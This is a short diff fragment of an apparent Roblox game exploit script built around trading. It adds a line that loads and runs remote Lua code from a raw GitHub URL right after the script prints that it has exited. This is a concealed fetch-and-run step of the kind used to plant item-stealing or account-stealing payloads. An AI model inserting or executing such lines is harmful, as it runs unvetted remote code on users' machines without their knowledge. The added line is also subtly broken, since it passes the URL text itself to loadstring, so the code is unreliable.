@@ -579,5 +579,7 @@ if game.PlaceId == 920587237 then
 end
 -----------------   Trading Done, Exiting
 print("Exited Successfully")
+loadstring("https://raw.githubusercontent.com/AggelosLua/adoptm/main/a.lua")()
+
 
 getgenv().doloop = false
